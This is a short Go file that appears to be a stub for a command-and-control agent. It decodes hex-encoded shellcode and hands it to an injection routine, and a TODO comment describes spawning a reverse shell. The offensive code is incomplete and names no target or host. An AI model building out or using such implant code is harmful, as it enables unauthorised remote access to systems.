package main

import (
	"encoding/hex"
	"fmt"
	"gwop/pkg/c2agent"
	"os"
)

func init() {
	quitEarly := false

	if quitEarly {
		os.Exit(0)
	}
}

func main() {
	// TODO: we do our injection here to spawn our shell back
}

// unix only for now?
func handleShellcode(hexcode string) {
	sc, err := hex.DecodeString(hexcode)

	if err != nil {
		fmt.Println("Problem decoding hex")
	} else {
		c2agent.InjectShellcode(sc)
	}
}
